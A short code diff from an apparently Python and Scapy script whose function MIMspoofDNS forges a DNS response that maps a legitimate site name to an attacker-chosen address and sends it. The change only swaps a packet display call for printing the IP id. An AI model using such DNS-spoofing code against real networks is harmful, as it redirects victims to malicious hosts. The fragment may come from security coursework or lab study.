@@ -35,7 +35,8 @@ def MIMspoofDNS(pkt, goodSite, evilSite) :
     EvilDNSResponse[DNS].qr = 1
     EvilDNSResponse[DNS].an = DNSRR(rrname = goodSite, rdata = evilSite)
     EvilDNSResponse[IP].id = pkt[IP].id
-    EvilDNSResponse.show()
+    # EvilDNSResponse.show()
+    print(EvilDNSResponse[IP].id)
     send(EvilDNSResponse)
     
 # def testSniffnExtract() :
